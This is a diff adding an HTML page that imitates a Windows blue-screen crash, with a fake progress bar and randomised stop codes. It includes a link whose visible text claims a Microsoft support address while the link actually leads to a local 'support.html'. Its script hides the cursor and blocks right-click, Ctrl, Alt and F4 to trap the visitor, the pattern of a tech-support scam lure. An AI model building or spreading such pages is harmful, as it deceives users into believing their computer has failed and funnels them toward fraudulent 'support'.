@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0078d7;
+            font-family: 'Segoe UI', sans-serif;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            cursor: none;
+        }
+        
+        .bsod-container {
+            max-width: 800px;
+            padding: 40px;
+        }
+        
+        .face {
+            font-size: 48px;
+            margin-bottom: 30px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .message {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .error-code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-family: 'Consolas', monospace;
+        }
+        
+        .qr-code {
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        
+        .support-link {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.3);
+            margin-top: 20px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: white;
+            width: 0%;
+            animation: progress 10s linear infinite;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="bsod-container">
+        <div class="face">:(</div>
+        <div class="title">Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</div>
+        
+        <div class="message">
+            <div id="progress-text">0% complete</div>
+            <div class="progress">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+        </div>
+        
+        <div class="error-code">
+            <div>Stop code: <span id="error-code">CRITICAL_PROCESS_DIED</span></div>
+            <div>Error ID: <span id="error-id">0x000000EF</span></div>
+            <div>Collection ID: <span id="collection-id">BC432197-0A1B-4C8D</span></div>
+        </div>
+        
+        <div class="message">
+            <p>For more information about this issue and possible fixes, visit:</p>
+            <a href="support.html" class="support-link" id="support-link">https://support.microsoft.com/windows/error/0x000000EF</a>
+            
+            <div style="margin-top: 20px;">
+                <p>If you call a support person, give them this info:</p>
+                <p>Stop code: CRITICAL_PROCESS_DIED</p>
+                <p>Error ID: 0x000000EF</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Simulate progress
+        let progress = 0;
+        const progressBar = document.getElementById('progress-bar');
+        const progressText = document.getElementById('progress-text');
+        
+        const progressInterval = setInterval(() => {
+            progress += Math.random() * 5;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(progressInterval);
+            }
+            progressBar.style.width = progress + '%';
+            progressText.textContent = Math.floor(progress) + '% complete';
+        }, 500);
+        
+        // Generate random error code
+        const errorCodes = [
+            { code: 'SYSTEM_THREAD_EXCEPTION_NOT_HANDLED', id: '0x0000007E', collection: 'A1B2C3D4-5E6F-7G8H' },
+            { code: 'IRQL_NOT_LESS_OR_EQUAL', id: '0x0000000A', collection: 'D4E5F6A7-8B9C-0D1E' },
+            { code: 'VIDEO_TDR_FAILURE', id: '0x00000117', collection: 'F2G3H4I5-6J7K-8L9M' },
+            { code: 'PAGE_FAULT_IN_NONPAGED_AREA', id: '0x00000050', collection: 'B3C4D5E6-7F8G-9H0I' }
+        ];
+        
+        const randomError = errorCodes[Math.floor(Math.random() * errorCodes.length)];
+        document.getElementById('error-code').textContent = randomError.code;
+        document.getElementById('error-id').textContent = randomError.id;
+        document.getElementById('collection-id').textContent = randomError.collection;
+        
+        // Update support link with error ID
+        const supportLink = document.getElementById('support-link');
+        supportLink.href = `support.html?error=${randomError.id}`;
+        supportLink.textContent = `https://support.microsoft.com/windows/error${randomError.id}`;
+        
+        // Prevent right-click and other interactions
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey || e.altKey || e.key === 'F4') {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
